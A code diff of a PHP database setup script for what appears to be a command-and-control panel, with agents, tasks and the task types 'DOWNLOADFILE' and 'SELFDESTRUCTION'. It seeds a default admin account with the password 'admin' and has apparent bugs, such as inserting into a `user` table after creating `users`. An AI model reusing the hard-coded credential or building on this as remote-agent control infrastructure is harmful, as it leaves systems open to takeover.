@@ -2,12 +2,9 @@
 $config = include(__DIR__ . '/config.php');
 require_once __DIR__ . "/lib.php";
 
-function setupDB($config)
+function setupAPI($config)
 {
-    if (!isset($config['db'])) die("No DB Configuration");
-    if (!isset($config['db']['username'])) die("unset DB username");
-    if (!isset($config['db']['dsn'])) die("unset DB dsn");
-    if (!isset($config['db']['password'])) die("unset DB password");
+    checkDbAccess($config);
 
     $connection_sql = "CREATE TABLE IF NOT EXISTS `connections` (
   `id` INT(10) UNSIGNED NOT NULL,
@@ -51,23 +48,23 @@ function setupDB($config)
     $db = getDb($config);
     if (!$db->beginTransaction()) die("Error on begin DB transaction ");
 
-    execSql($db,$connection_sql,"connection table");
-    execSql($db,$connection_index,"connection index");
+    execSql($db,$connection_sql,"create connection table");
+    execSql($db,$connection_index,"create connection index");
 
-    execSql($db,$task_sql,"task table");
-    execSql($db,$task_index,"task index");
+    execSql($db,$task_sql,"create task table");
+    execSql($db,$task_index,"create task index");
 
-    execSql($db,$agent_sql,"agent table");
+    execSql($db,$agent_sql,"create agent table");
     execSql($db,$agent_index,"agent index");
 
-    execSql($db,$task_agent_sql,"task-agent table");
-    execSql($db,$task_agent_index,"task-agent index");
+    execSql($db,$task_agent_sql,"create task-agent table");
+    execSql($db,$task_agent_index,"create task-agent index");
 
-    execSql($db,$ai_connections,"auto increment connections");
-    execSql($db,$ai_tasks,"auto increment tasks");
+    execSql($db,$ai_connections,"create auto increment connections");
+    execSql($db,$ai_tasks,"create auto increment tasks");
     
-    execSql($db,$fk_agent_id,"fk task-agent agent_id");
-    execSql($db,$fk_task_id,"fk task-agent task_id");
+    execSql($db,$fk_agent_id,"create fk task-agent agent_id");
+    execSql($db,$fk_task_id,"create fk task-agent task_id");
 
     dummy($db);
 
@@ -87,26 +84,46 @@ function dummy($db)
 (1, 1, 0, '2015-08-09 16:13:38');";
     $dummy_agent = "INSERT INTO `agent` (`id`) VALUES (1)";
 
-    execSql($db,$dummy_task,"dummy_task");
-    execSql($db,$dummy_task2,"dummy_task2");
-    execSql($db, $dummy_agent, "dummy_agent");
-    execSql($db,$dummy_task_agent, "dummy_task_agent");
-
-
+    execSql($db,$dummy_task,"add dummy_task");
+    execSql($db,$dummy_task2,"add dummy_task2");
+    execSql($db, $dummy_agent, "add dummy_agent");
+    execSql($db,$dummy_task_agent, "add dummy_task_agent");
 }
 
-function execSql($db,$sql,$title,$success_result = 0)
+function setupAdmin($config)
 {
-    echo "Create ". $title ."........";
-    /** @var PDO $db */
-    $result = $db->exec($sql);
-    if ($result === false) {
-        $db->rollBack();
-        echo "error\nError stack: " . print_r($db->errorInfo(),true) . "\n";
-        die;
-    }
-    echo "success\n";
+    checkDbAccess($config);
+
+    $user_sql = "CREATE TABLE `users` ( `id` INT NOT NULL AUTO_INCREMENT ,
+`name` TEXT NOT NULL ,
+`password` TEXT NOT NULL ,
+`auth_key` TEXT NOT NULL ,
+PRIMARY KEY (`id`)) ENGINE = InnoDB;";
+    $group_sql = "CREATE TABLE `groups` ( `id` INT NOT NULL AUTO_INCREMENT , `name` INT NOT NULL , `created` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP , PRIMARY KEY (`id`)) ENGINE = InnoDB;";
+    $task_types = "CREATE TABLE `task_types` (`id` INT NOT NULL AUTO_INCREMENT , `name` TEXT NOT NULL , PRIMARY KEY (`id`)) ENGINE = InnoDB";
+
+    $default_task_types = "INSERT INTO task_types (`name`) VALUES ('DOWNLOADFILE'),('SELFDESTRUCTION')";
+
+
+    $db = getDb($config);
+
+    $t = $db->beginTransaction();
+    if (!$t) die("cannot create DB transaction");
+
+    execSql($db,$user_sql,"create user table");
+    execSql($db,$group_sql,"create groups table");
+    execSql($db,$task_types,"create task types table");
+    execSql($db,$default_task_types,"add default task types");
+    dummyUser($db);
 }
 
-setupDB($config);
+function dummyUser($db) {
+    $pass = hashPassword("admin");
+    $key = generateRandomString();
+    $sql = "INSERT INTO user VALUES (NULL,'admin','{$pass}','{$key}');";
+    execSql($db,$sql,"add admin user");
+}
+
+setupAPI($config);
+setupAdmin($config);
 
